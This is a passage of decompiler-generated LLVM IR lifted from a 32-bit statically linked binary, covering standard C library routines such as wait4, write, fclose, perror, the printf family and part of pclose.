  store i32 %v2_805b16c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805b16c, -4095
  br i1 %tmp, label %dec_label_pc_805b184, label %dec_label_pc_805b178

dec_label_pc_805b178:                             ; preds = %entry
  %v1_805b178 = call i32 @__errno_location(i32 %v0_805b164)
  %v0_805b17d = load i32, i32* %edi.global-to-local, align 4
  %v1_805b17d = sub i32 0, %v0_805b17d
  %v2_805b17f = inttoptr i32 %v1_805b178 to i32*
  store i32 %v1_805b17d, i32* %v2_805b17f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b184

dec_label_pc_805b184:                             ; preds = %entry, %dec_label_pc_805b178
  %v0_805b184 = phi i32 [ %v2_805b16c, %entry ], [ -1, %dec_label_pc_805b178 ]
  %v2_805b186 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b186, i32* @edx, align 4
  %v2_805b188 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b188, i32* @edi, align 4
  ret i32 %v0_805b184

; uselistorder directives
  uselistorder i32 %v2_805b16c, { 1, 0, 2 }
  uselistorder i32 %v0_805b164, { 1, 0 }
  uselistorder label %dec_label_pc_805b184, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_805b199 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_805b199
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b1a4 = load i32, i32* @edi, align 4
  %v0_805b1a5 = load i32, i32* @esi, align 4
  store i32 %v0_805b1a5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_805b1b9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805b1c1 = call i32 @wait4(i32 %v0_805b1b9, i32 %v0_805b1a5, i32 %v0_805b1a4, i32 %tmp5)
  store i32 %v0_805b1b9, i32* @ebx, align 4
  store i32 %v4_805b1c1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805b1c1, -4095
  br i1 %tmp, label %dec_label_pc_805b1d9, label %dec_label_pc_805b1cd

dec_label_pc_805b1cd:                             ; preds = %entry
  %v1_805b1cd = call i32 @__errno_location(i32 %v0_805b1b9)
  %v0_805b1d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b1d2 = sub i32 0, %v0_805b1d2
  %v2_805b1d4 = inttoptr i32 %v1_805b1cd to i32*
  store i32 %v1_805b1d2, i32* %v2_805b1d4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b1d9

dec_label_pc_805b1d9:                             ; preds = %entry, %dec_label_pc_805b1cd
  %v0_805b1d9 = phi i32 [ %v4_805b1c1, %entry ], [ -1, %dec_label_pc_805b1cd ]
  %v2_805b1db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b1db, i32* @edx, align 4
  %v2_805b1dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b1dc, i32* @esi, align 4
  store i32 %v0_805b1a4, i32* @edi, align 4
  ret i32 %v0_805b1d9

; uselistorder directives
  uselistorder i32 %v4_805b1c1, { 1, 0, 2 }
  uselistorder i32 %v0_805b1b9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b1d9, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805b1f1 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805b1f1
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b1fc = load i32, i32* @edi, align 4
  store i32 %v0_805b1fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805b20c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805b214 = call i32 @write(i32 %v0_805b20c, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805b20c, i32* @ebx, align 4
  store i32 %v3_805b214, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b214, -4095
  br i1 %tmp, label %dec_label_pc_805b22c, label %dec_label_pc_805b220

dec_label_pc_805b220:                             ; preds = %entry
  %v1_805b220 = call i32 @__errno_location(i32 %v0_805b20c)
  %v0_805b225 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b225 = sub i32 0, %v0_805b225
  %v2_805b227 = inttoptr i32 %v1_805b220 to i32*
  store i32 %v1_805b225, i32* %v2_805b227, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b22c

dec_label_pc_805b22c:                             ; preds = %entry, %dec_label_pc_805b220
  %v0_805b22c = phi i32 [ %v3_805b214, %entry ], [ -1, %dec_label_pc_805b220 ]
  %v2_805b22e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b22e, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805b230 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b230, i32* @edi, align 4
  ret i32 %v0_805b22c

; uselistorder directives
  uselistorder i32 %v3_805b214, { 1, 0, 2 }
  uselistorder i32 %v0_805b20c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805b22c, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805b238 = add i32 %arg1, 128
  %v6_805b243 = icmp ugt i32 %v1_805b238, 383
  br i1 %v6_805b243, label %dec_label_pc_805b24e, label %dec_label_pc_805b245

dec_label_pc_805b245:                             ; preds = %entry
  %v0_805b245 = load i32, i32* inttoptr (i32 134694404 to i32*), align 4
  %v2_805b24a = mul i32 %arg1, 2
  %v3_805b24a = add i32 %v0_805b245, %v2_805b24a
  %v4_805b24a = inttoptr i32 %v3_805b24a to i16*
  %v5_805b24a = load i16, i16* %v4_805b24a, align 2
  %v6_805b24a = sext i16 %v5_805b24a to i32
  br label %dec_label_pc_805b24e

dec_label_pc_805b24e:                             ; preds = %entry, %dec_label_pc_805b245
  %v0_805b24e = phi i32 [ %arg1, %entry ], [ %v6_805b24a, %dec_label_pc_805b245 ]
  ret i32 %v0_805b24e

; uselistorder directives
  uselistorder label %dec_label_pc_805b24e, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805b254 = load i32, i32* @ebp, align 4
  %v0_805b255 = load i32, i32* @edi, align 4
  %v0_805b256 = load i32, i32* @esi, align 4
  %v0_805b257 = load i32, i32* @ebx, align 4
  %v4_805b25b = ptrtoint i16* %arg1 to i32
  store i32 %v4_805b25b, i32* @esi, align 4
  %v1_805b25f = add i32 %v4_805b25b, 52
  %v2_805b25f = inttoptr i32 %v1_805b25f to i32*
  %v3_805b25f = load i32, i32* %v2_805b25f, align 4
  store i32 %v3_805b25f, i32* @ebp, align 4
  %v1_805b262 = icmp eq i32 %v3_805b25f, 0
  %v1_805b264 = icmp eq i1 %v1_805b262, false
  br i1 %v1_805b264, label %dec_label_pc_805b285, label %dec_label_pc_805b266

dec_label_pc_805b266:                             ; preds = %entry
  %v1_805b266 = add i32 %v4_805b25b, 56
  store i32 %v1_805b266, i32* @ebx, align 4
  %v4_805b275 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 %v1_805b266)
  %v0_805b27a = load i32, i32* @ebx, align 4
  %v1_805b27d = call i32 @pthread_mutex_lock(i32 %v0_805b27a)
  %v0_805b287.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b285

dec_label_pc_805b285:                             ; preds = %entry, %dec_label_pc_805b266
  %v0_805b28f = phi i32 [ %v4_805b25b, %entry ], [ %v0_805b287.pre, %dec_label_pc_805b266 ]
  store i32 0, i32* @edi, align 4
  %v1_805b287 = inttoptr i32 %v0_805b28f to i8*
  %v2_805b287 = load i8, i8* %v1_805b287, align 1
  %v3_805b287 = and i8 %v2_805b287, 64
  %v4_805b287 = icmp eq i8 %v3_805b287, 0
  br i1 %v4_805b287, label %dec_label_pc_805b285.dec_label_pc_805b29a_crit_edge, label %dec_label_pc_805b28c

dec_label_pc_805b285.dec_label_pc_805b29a_crit_edge: ; preds = %dec_label_pc_805b285
  br label %dec_label_pc_805b29a

dec_label_pc_805b28c:                             ; preds = %dec_label_pc_805b285
  %v1_805b290 = inttoptr i32 %v0_805b28f to i16*
  %v2_805b290 = call i32 @fflush_unlocked(i16* %v1_805b290)
  store i32 %v2_805b290, i32* @edi, align 4
  %v0_805b29d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b29a

dec_label_pc_805b29a:                             ; preds = %dec_label_pc_805b285.dec_label_pc_805b29a_crit_edge, %dec_label_pc_805b28c
  %v0_805b29d = phi i32 [ %v0_805b28f, %dec_label_pc_805b285.dec_label_pc_805b29a_crit_edge ], [ %v0_805b29d.pre, %dec_label_pc_805b28c ]
  %v1_805b29d = add i32 %v0_805b29d, 4
  %v2_805b29d = inttoptr i32 %v1_805b29d to i32*
  %v3_805b29d = load i32, i32* %v2_805b29d, align 4
  %v1_805b2a0 = call i32 @__libc_close(i32 %v3_805b29d)
  %v2_805b2a8 = icmp slt i32 %v1_805b2a0, 0
  %v1_805b2aa = icmp eq i1 %v2_805b2a8, false
  br i1 %v1_805b2aa, label %dec_label_pc_805b2af, label %dec_label_pc_805b2ac

dec_label_pc_805b2ac:                             ; preds = %dec_label_pc_805b29a
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805b2af

dec_label_pc_805b2af:                             ; preds = %dec_label_pc_805b29a, %dec_label_pc_805b2ac
  %v0_805b2af = load i32, i32* @esi, align 4
  %v1_805b2af = add i32 %v0_805b2af, 4
  %v2_805b2af = inttoptr i32 %v1_805b2af to i32*
  store i32 -1, i32* %v2_805b2af, align 4
  %v2_805b2c1 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805b2c1, i32* @ebx, align 4
  %v4_805b2c6 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134585853, i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v1_805b2d2 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v0_805b2d7 = load i32, i32* @global_var_807aefc.687, align 4
  %v1_805b2dc = add i32 %v0_805b2d7, 1
  store i32 %v1_805b2dc, i32* @global_var_807aefc.687, align 4
  %v3_805b2e7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805b2ef = load i32, i32* @esi, align 4
  %v1_805b2ef = inttoptr i32 %v0_805b2ef to i16*
  %v2_805b2ef = load i16, i16* %v1_805b2ef, align 2
  %v3_805b2ef = and i16 %v2_805b2ef, 24576
  store i16 %v3_805b2ef, i16* %v1_805b2ef, align 2
  %v0_805b2f4 = load i32, i32* @esi, align 4
  %v1_805b2f4 = inttoptr i32 %v0_805b2f4 to i16*
  %v2_805b2f4 = load i16, i16* %v1_805b2f4, align 2
  %v3_805b2f4 = or i16 %v2_805b2f4, 48
  store i16 %v3_805b2f4, i16* %v1_805b2f4, align 2
  br i1 %v1_805b264, label %dec_label_pc_805b30d, label %dec_label_pc_805b2fc

dec_label_pc_805b2fc:                             ; preds = %dec_label_pc_805b2af
  %v3_805b305 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805b30d

dec_label_pc_805b30d:                             ; preds = %dec_label_pc_805b2af, %dec_label_pc_805b2fc
  %v0_805b30d = load i32, i32* @esi, align 4
  %v1_805b30d = add i32 %v0_805b30d, 1
  %v2_805b30d = inttoptr i32 %v1_805b30d to i8*
  %v3_805b30d = load i8, i8* %v2_805b30d, align 1
  %v4_805b30d = and i8 %v3_805b30d, 64
  %v5_805b30d = icmp eq i8 %v4_805b30d, 0
  br i1 %v5_805b30d, label %dec_label_pc_805b321, label %dec_label_pc_805b313

dec_label_pc_805b313:                             ; preds = %dec_label_pc_805b30d
  %v1_805b316 = add i32 %v0_805b30d, 8
  %v2_805b316 = inttoptr i32 %v1_805b316 to i32*
  %v3_805b316 = load i32, i32* %v2_805b316, align 4
  %v1_805b319 = call i32 @free(i32 %v3_805b316)
  br label %dec_label_pc_805b321

dec_label_pc_805b321:                             ; preds = %dec_label_pc_805b30d, %dec_label_pc_805b313
  %v4_805b32d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134585853, i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v1_805b339 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v0_805b340 = load i32, i32* @global_var_807af00.688, align 256
  %v1_805b340 = add i32 %v0_805b340, 1
  store i32 %v1_805b340, i32* @global_var_807af00.688, align 256
  %v3_805b349 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805b34e = call i32 @_stdio_openlist_dec_use()
  %v0_805b356 = load i32, i32* @edi, align 4
  store i32 %v0_805b257, i32* @ebx, align 4
  store i32 %v0_805b256, i32* @esi, align 4
  store i32 %v0_805b255, i32* @edi, align 4
  store i32 %v0_805b254, i32* @ebp, align 4
  ret i32 %v0_805b356

; uselistorder directives
  uselistorder label %dec_label_pc_805b321, { 1, 0 }
  uselistorder label %dec_label_pc_805b30d, { 1, 0 }
  uselistorder label %dec_label_pc_805b2af, { 1, 0 }
  uselistorder label %dec_label_pc_805b29a, { 1, 0 }
  uselistorder label %dec_label_pc_805b285, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805b36f = inttoptr i32 %arg2 to i8*
  %v5_805b36f = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805b36f, i32 0, i32 -1)
  ret i32 %v5_805b36f
}

define i32 @perror(i8* %arg1) local_unnamed_addr {
entry:
  %v1_805b37f = icmp eq i8* %arg1, null
  br i1 %v1_805b37f, label %dec_label_pc_805b38d, label %dec_label_pc_805b383

dec_label_pc_805b383:                             ; preds = %entry
  %v4_805b37b = ptrtoint i8* %arg1 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_806e3f7.689 to i32), i32* @edx, align 4
  %v2_805b388 = load i8, i8* %arg1, align 1
  %v3_805b388 = icmp eq i8 %v2_805b388, 0
  %v1_805b38b = icmp eq i1 %v3_805b388, false
  br i1 %v1_805b38b, label %dec_label_pc_805b394, label %dec_label_pc_805b38d

dec_label_pc_805b38d:                             ; preds = %dec_label_pc_805b383, %entry
  store i32 ptrtoint (i32* @global_var_806e3f9.690 to i32), i32* @edx, align 4
  br label %dec_label_pc_805b394

dec_label_pc_805b394:                             ; preds = %dec_label_pc_805b383, %dec_label_pc_805b38d
  %v0_805b395 = phi i32 [ %v4_805b37b, %dec_label_pc_805b383 ], [ ptrtoint (i32* @global_var_806e3f9.690 to i32), %dec_label_pc_805b38d ]
  %v0_805b394 = phi i32 [ ptrtoint ([3 x i8]* @global_var_806e3f7.689 to i32), %dec_label_pc_805b383 ], [ ptrtoint (i32* @global_var_806e3f9.690 to i32), %dec_label_pc_805b38d ]
  %v0_805b39b = load i32, i32* inttoptr (i32 134694416 to i32*), align 16
  %v6_805b3a1 = call i32 @fprintf(i32 %v0_805b39b, i32 ptrtoint ([8 x i8]* @global_var_806cae0.691 to i32), i32 %v0_805b395, i32 %v0_805b394)
  ret i32 %v6_805b3a1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_806e3f9.690 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b394, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805b3bd = inttoptr i32 %arg1 to i8*
  %v5_805b3bd = call i32 @__GI_vsnprintf(i8* %v4_805b3bd, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_805b3bd
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805b3cb = ptrtoint i32* %stack_var_12 to i32
  %v0_805b3d3 = load i32, i32* @edx, align 4
  %v4_805b3dd = inttoptr i32 %arg1 to i16*
  %v5_805b3dd = call i32 @__GI_vfprintf(i16* %v4_805b3dd, i32 %arg2, i32 %v2_805b3cb, i32 %v0_805b3d3)
  ret i32 %v5_805b3dd
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_805b3eb = ptrtoint i32* %stack_var_16 to i32
  %v4_805b400 = inttoptr i32 %arg1 to i8*
  %v5_805b400 = call i32 @__GI_vsnprintf(i8* %v4_805b400, i32 %arg2, i32 %arg3, i32 %v2_805b3eb)
  ret i32 %v5_805b400
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805b40f = ptrtoint i32* %stack_var_12 to i32
  %v0_805b417 = load i32, i32* @edx, align 4
  %v4_805b421 = inttoptr i32 %arg1 to i32*
  %v5_805b421 = call i32 @__GI_vasprintf(i32* %v4_805b421, i32 %arg2, i32 %v2_805b40f, i32 %v0_805b417)
  ret i32 %v5_805b421
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805b42f = ptrtoint i32* %stack_var_12 to i32
  %v4_805b442 = inttoptr i32 %arg1 to i8*
  %v5_805b442 = call i32 @__GI_vsnprintf(i8* %v4_805b442, i32 -1, i32 %arg2, i32 %v2_805b42f)
  ret i32 %v5_805b442
}

define i32 @__GI_vasprintf(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* %stack_var_-44, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b44e = load i32, i32* @esi, align 4
  %v0_805b44f = load i32, i32* @ebx, align 4
  store i32 %v0_805b44f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v5_805b469 = call i32 @__GI_vsnprintf(i8* null, i32 0, i32 %arg3, i32 %tmp10)
  store i32 %v5_805b469, i32* @ebx, align 4
  %v0_805b473 = load i32, i32* @edi, align 4
  %v1_805b473 = inttoptr i32 %v0_805b473 to i32*
  store i32 0, i32* %v1_805b473, align 4
  %v2_805b479 = icmp slt i32 %v5_805b469, 0
  br i1 %v2_805b479, label %dec_label_pc_805b4b5, label %dec_label_pc_805b47d

dec_label_pc_805b47d:                             ; preds = %entry
  %v0_805b480 = load i32, i32* @ebx, align 4
  %v1_805b480 = add i32 %v0_805b480, 1
  store i32 %v1_805b480, i32* @ebx, align 4
  %v1_805b482 = call i32 @malloc(i32 %v1_805b480)
  %v1_805b48a = load i32, i32* @edi, align 4
  %v2_805b48a = inttoptr i32 %v1_805b48a to i32*
  store i32 %v1_805b482, i32* %v2_805b48a, align 4
  %v1_805b48c = icmp eq i32 %v1_805b482, 0
  br i1 %v1_805b48c, label %dec_label_pc_805b4b5, label %dec_label_pc_805b490

dec_label_pc_805b490:                             ; preds = %dec_label_pc_805b47d
  %v0_805b490 = load i32, i32* @esi, align 4
  %v0_805b492 = load i32, i32* @ebx, align 4
  %v3_805b494 = load i32, i32* %stack_var_-44, align 4
  %v4_805b494 = inttoptr i32 %v1_805b482 to i8*
  %v5_805b494 = call i32 @__GI_vsnprintf(i8* %v4_805b494, i32 %v0_805b492, i32 %v0_805b490, i32 %v3_805b494)
  store i32 %v5_805b494, i32* @ebx, align 4
  %v2_805b49e = icmp slt i32 %v5_805b494, 0
  %v1_805b4a0 = icmp eq i1 %v2_805b49e, false
  br i1 %v1_805b4a0, label %dec_label_pc_805b4b5, label %dec_label_pc_805b4a2

dec_label_pc_805b4a2:                             ; preds = %dec_label_pc_805b490
  %v0_805b4a5 = load i32, i32* @edi, align 4
  %v1_805b4a5 = inttoptr i32 %v0_805b4a5 to i32*
  %v2_805b4a5 = load i32, i32* %v1_805b4a5, align 4
  %v1_805b4a7 = call i32 @free(i32 %v2_805b4a5)
  %v0_805b4ac = load i32, i32* @edi, align 4
  %v1_805b4ac = inttoptr i32 %v0_805b4ac to i32*
  store i32 0, i32* %v1_805b4ac, align 4
  br label %dec_label_pc_805b4b5

dec_label_pc_805b4b5:                             ; preds = %dec_label_pc_805b490, %dec_label_pc_805b47d, %entry, %dec_label_pc_805b4a2
  %v0_805b4b8 = load i32, i32* @ebx, align 4
  %v2_805b4ba = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b4ba, i32* @ebx, align 4
  store i32 %v0_805b44e, i32* @esi, align 4
  ret i32 %v0_805b4b8

; uselistorder directives
  uselistorder i32 %v5_805b494, { 1, 0 }
  uselistorder i32 %v1_805b482, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_805b4b5, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b4c0 = load i32, i32* @ebp, align 4
  %v0_805b4c1 = load i32, i32* @edi, align 4
  %v0_805b4c2 = load i32, i32* @esi, align 4
  %v0_805b4c3 = load i32, i32* @ebx, align 4
  store i32 %v0_805b4c3, i32* %stack_var_-16, align 4
  %v4_805b4c7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805b4c7, i32* @esi, align 4
  %v2_805b4cb = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_805b4fc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805b4fc, i32* @ebp, align 4
  %v1_805b500 = sub i32 -1, %v4_805b4c7
  store i32 %v1_805b500, i32* @ebx, align 4
  %v1_805b503 = call i32 @__stdio_init_mutex(i32 %v2_805b4cb)
  %v0_805b513 = load i32, i32* @ebx, align 4
  %v1_805b513 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_805b513, %v1_805b513
  br i1 %tmp, label %dec_label_pc_805b517, label %dec_label_pc_805b519

dec_label_pc_805b517:                             ; preds = %entry
  store i32 %v1_805b513, i32* @ebx, align 4
  br label %dec_label_pc_805b519

dec_label_pc_805b519:                             ; preds = %entry, %dec_label_pc_805b517
  %v1_805b519 = phi i32 [ %v0_805b513, %entry ], [ %v1_805b513, %dec_label_pc_805b517 ]
  %v0_805b519 = load i32, i32* @esi, align 4
  %v2_805b519 = add i32 %v0_805b519, %v1_805b519
  %v4_805b544 = inttoptr i32 %arg3 to i8*
  %v5_805b544 = call i32 @_vfprintf_internal(i32 %v2_805b4fc, i8* %v4_805b544, i32 %arg4, i32 %v2_805b519)
  store i32 %v5_805b544, i32* @edx, align 4
  %v0_805b54e = load i32, i32* @ebx, align 4
  %v1_805b54e = icmp eq i32 %v0_805b54e, 0
  br i1 %v1_805b54e, label %dec_label_pc_805b568, label %dec_label_pc_805b552

dec_label_pc_805b552:                             ; preds = %dec_label_pc_805b519
  %v16_805b556 = icmp eq i32 %v1_805b519, 0
  %v1_805b55a = icmp eq i1 %v16_805b556, false
  br i1 %v1_805b55a, label %dec_label_pc_805b561, label %dec_label_pc_805b55c

dec_label_pc_805b55c:                             ; preds = %dec_label_pc_805b552
  %v1_805b55c = add i32 %v2_805b519, -1
  br label %dec_label_pc_805b561

dec_label_pc_805b561:                             ; preds = %dec_label_pc_805b552, %dec_label_pc_805b55c
  %stack_var_-80.0.in = phi i32 [ %v0_805b519, %dec_label_pc_805b552 ], [ %v1_805b55c, %dec_label_pc_805b55c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805b56b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805b568

dec_label_pc_805b568:                             ; preds = %dec_label_pc_805b519, %dec_label_pc_805b561
  %v0_805b56b = phi i32 [ %v5_805b544, %dec_label_pc_805b519 ], [ %v0_805b56b.pre, %dec_label_pc_805b561 ]
  %v2_805b56d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b56d, i32* @ebx, align 4
  store i32 %v0_805b4c2, i32* @esi, align 4
  store i32 %v0_805b4c1, i32* @edi, align 4
  store i32 %v0_805b4c0, i32* @ebp, align 4
  ret i32 %v0_805b56b

; uselistorder directives
  uselistorder i32 %v0_805b519, { 1, 0 }
  uselistorder i32 %v1_805b519, { 1, 0 }
  uselistorder i32 %v1_805b513, { 1, 2, 0 }
  uselistorder i32 %v0_805b513, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_805b568, { 1, 0 }
  uselistorder label %dec_label_pc_805b561, { 1, 0 }
  uselistorder label %dec_label_pc_805b519, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805b574 = load i32, i32* @edi, align 4
  %v0_805b575 = load i32, i32* @esi, align 4
  %v0_805b576 = load i32, i32* @ebx, align 4
  store i32 %v0_805b576, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805b588 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805b588, i32* %stack_var_-60, align 4
  %v4_805b58d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  store i32 ptrtoint (i32* @global_var_807aee0.692 to i32), i32* %stack_var_-60, align 4
  %v1_805b599 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  %v0_805b59e = load i32, i32* @global_var_807aef8.693, align 8
  store i32 %v0_805b59e, i32* @ebx, align 4
  %v1_805b5a7 = icmp eq i32 %v0_805b59e, 0
  br i1 %v1_805b5a7, label %dec_label_pc_805b5dd, label %dec_label_pc_805b5ab

dec_label_pc_805b5ab:                             ; preds = %entry
  %v1_805b5ab = add i32 %v0_805b59e, 4
  %v2_805b5ab = inttoptr i32 %v1_805b5ab to i32*
  %v3_805b5ab = load i32, i32* %v2_805b5ab, align 4
  %v4_805b5ab = load i32, i32* @edi, align 4
  %v15_805b5ab = icmp eq i32 %v3_805b5ab, %v4_805b5ab
  %v1_805b5ae = icmp eq i1 %v15_805b5ab, false
  br i1 %v1_805b5ae, label %dec_label_pc_805b5cc, label %dec_label_pc_805b5b0

dec_label_pc_805b5b0:                             ; preds = %dec_label_pc_805b5ab
  %v1_805b5b0 = inttoptr i32 %v0_805b59e to i32*
  %v2_805b5b0 = load i32, i32* %v1_805b5b0, align 4
  store i32 %v2_805b5b0, i32* @global_var_807aef8.693, align 8
  br label %dec_label_pc_805b5dd

dec_label_pc_805b5b9:                             ; preds = %dec_label_pc_805b5cc
  %v0_805b5b9 = load i32, i32* %stack_var_-60, align 4
  %v1_805b5b9 = call i32 @__errno_location(i32 %v0_805b5b9)
  %v1_805b5be = inttoptr i32 %v1_805b5b9 to i32*
  store i32 22, i32* %v1_805b5be, align 4
  br label %dec_label_pc_805b5dd

dec_label_pc_805b5c6:                             ; preds = %dec_label_pc_805b609
  %v3_805b5c6 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805b62b

dec_label_pc_805b5cc:                             ; preds = %dec_label_pc_805b5ab, %dec_label_pc_805b5d4
  %v1_805b5db = phi i32 [ %v2_805b5ce, %dec_label_pc_805b5d4 ], [ %v0_805b59e, %dec_label_pc_805b5ab ]
  %v1_805b5ce = inttoptr i32 %v1_805b5db to i32*
  %v2_805b5ce = load i32, i32* %v1_805b5ce, align 4
  store i32 %v2_805b5ce, i32* @ebx, align 4
  %v1_805b5d0 = icmp eq i32 %v2_805b5ce, 0
  br i1 %v1_805b5d0, label %dec_label_pc_805b5b9, label %dec_label_pc_805b5d4

dec_label_pc_805b5d4:                             ; preds = %dec_label_pc_805b5cc
  %v1_805b5d4 = add i32 %v2_805b5ce, 4
  %v2_805b5d4 = inttoptr i32 %v1_805b5d4 to i32*
  %v3_805b5d4 = load i32, i32* %v2_805b5d4, align 4
